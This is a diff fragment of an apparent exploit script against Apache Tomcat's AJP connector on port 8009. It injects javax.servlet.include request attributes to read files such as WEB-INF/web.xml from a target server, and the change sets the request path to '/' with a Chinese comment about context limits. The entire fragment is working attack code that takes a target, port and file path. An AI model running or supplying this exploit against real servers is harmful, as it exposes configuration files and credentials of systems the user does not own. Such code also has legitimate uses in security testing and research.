@@ -293,7 +293,8 @@ parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to at
 parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
 args = parser.parse_args()
 t = Tomcat(args.target, args.port)
-_,data = t.perform_request('/asdf',attributes=[
+# 路径需要存在，无法穿越当前context
+_,data = t.perform_request('/',attributes=[ 
     {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
     {'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
     {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
